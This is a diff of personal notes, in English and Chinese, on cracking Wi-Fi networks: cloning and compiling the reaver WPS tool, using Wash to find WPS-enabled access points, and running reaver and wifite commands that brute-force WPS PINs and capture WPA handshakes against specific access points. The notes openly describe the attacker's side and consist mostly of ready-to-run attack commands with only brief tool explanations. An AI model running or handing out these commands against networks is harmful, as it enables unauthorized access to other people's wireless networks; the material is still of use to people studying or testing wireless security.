@@ -155,23 +155,23 @@ sudo apt -y install build-essential libpcap-dev aircrack-ng pixiewps
 
 Setup
 
-Download
+# Download
 git clone https://github.com/t6x/reaver-wps-fork-t6x
 or
 wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip && unzip master.zip
 
-Locate the shell
-cd reaver-wps-fork-t6x*
+# Locate the shell
+cd reaver-wps-fork-t6x
 cd src
 
-Compile
+# Compile
 ./configure
 make
 
-Install
+# install
 sudo make install
 
-----------------------------------
+------------
 
 Wash
 当攻击者在对WPS PIN码进行暴力破解攻击时，很多接入点会将自己锁定以保证路由器的安全性。而Wash就是一款能够确定目标接入点是否开启了WPS的工具，
@@ -202,7 +202,7 @@ sudo reaver -i wlan0mon -b E4:47 -c 8 -M -S -K -vv
     -F，忽略帧校验错误
 
 sudo reaver -i wlan0mon -b BC:D1  -vv
-
+sudo reaver -i wlx001 -b A2:69  -c 6 -M -S -vv
 
 ------------------------------------------------------------------------------------------------------
 
@@ -285,7 +285,8 @@ sudo make install
 Wifite  #########     202608
 
 sudo apt install wifite                         #########  成功
-sudo wifite  --wpa --no-pmkid --no-wps           #########
+sudo wifite -no-pmkid --no-wps                 #########   handshake
+sudo wifite --wps-only --no-pixie                           PIN
 
 sudo airodump-ng wlan0mon                      ###########  先 airodump-ng：用于数据包捕获wlan0mon  ，有数据包流动的，优先!!!!!
 
